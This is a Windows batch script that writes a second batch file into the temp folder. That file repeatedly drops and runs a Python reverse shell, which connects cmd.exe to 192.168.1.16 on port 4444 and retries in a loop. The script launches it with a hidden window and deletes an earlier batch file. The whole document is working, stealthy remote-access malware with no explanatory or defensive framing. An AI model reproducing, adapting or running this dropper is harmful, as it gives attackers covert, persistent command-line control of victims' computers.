@echo off
cd %temp%
echo    @echo off > pro1.bat
echo    del vb1.bat >> pro1.bat
echo    :loop >> pro1.bat
echo    if not exist "%temp%\sh1.py" ^( >> pro1.bat
echo        ^( >> pro1.bat
echo            echo import socket >> pro1.bat
echo            echo import os >> pro1.bat
echo            echo import threading >> pro1.bat
echo            echo import subprocess as sp >> pro1.bat
echo            echo import time >> pro1.bat
echo            echo. >> pro1.bat
echo            echo def rev^^(^^): >> pro1.bat
echo            echo    p = sp.Popen^^(['cmd.exe'], stdin=sp.PIPE, stdout=sp.PIPE, stderr=sp.STDOUT^^) >> pro1.bat
echo            echo    s = socket.socket^^(^^) >> pro1.bat
echo            echo. >> pro1.bat
echo            echo    try^^: >> pro1.bat
echo            echo        s.connect^^(^^('192.168.1.16', 4444^^)^^) >> pro1.bat
echo            echo    except ConnectionRefusedError as e^^: >> pro1.bat
echo            echo        print^^('refused ... Check if listener is running.'^^) >> pro1.bat
echo            echo        return >> pro1.bat
echo            echo. >> pro1.bat
echo            echo    def s_o^^(^^): >> pro1.bat
echo            echo        while True^^: >> pro1.bat
echo            echo            try^^: >> pro1.bat
echo            echo                output = os.read^^(p.stdout.fileno^^(^^), 1024^^) >> pro1.bat
echo            echo                if not output^^: >> pro1.bat
echo            echo                    break >> pro1.bat
echo            echo                s.sendall^^(output^^) >> pro1.bat
echo            echo            except Exception as e^^: >> pro1.bat
echo            echo                print^^("Error sending output:", e^^) >> pro1.bat
echo            echo                break >> pro1.bat
echo            echo. >> pro1.bat
echo            echo    def r_i^^(^^): >> pro1.bat
echo            echo        while True^^: >> pro1.bat
echo            echo            try^^: >> pro1.bat
echo            echo                data = s.recv^^(1024^^) >> pro1.bat
echo            echo                if not data^^: >> pro1.bat
echo            echo                    break >> pro1.bat
echo            echo                p.stdin.write^^(data^^) >> pro1.bat
echo            echo                p.stdin.flush^^(^^) >> pro1.bat
echo            echo            except Exception as e^^: >> pro1.bat
echo            echo                print^^("Error receiving input:", e^^) >> pro1.bat
echo            echo                break >> pro1.bat
echo            echo. >> pro1.bat
echo            echo    threading.Thread^^(target=s_o, daemon=True^^).start^^(^^) >> pro1.bat
echo            echo    threading.Thread^^(target=r_i, daemon=True^^).start^^(^^) >> pro1.bat
echo            echo. >> pro1.bat
echo            echo    time.sleep^^(30^^) >> pro1.bat
echo            echo. >> pro1.bat
echo            echo while True^^: >> pro1.bat
echo            echo    rev^^(^^) >> pro1.bat
echo            echo    print^^("Loading ..."^^) >> pro1.bat
echo        ) ^> %temp%\sh1.py^ >> pro1.bat
echo    ) else ( >> pro1.bat
echo    python %temp%\sh1.py >> pro1.bat
echo    timeout /t 60 >nul >> pro1.bat
echo    ) >> pro1.bat
echo    goto loop >> pro1.bat
powershell -c "Start-Process -FilePath "%temp%\pro1.bat" -WindowStyle Hidden"
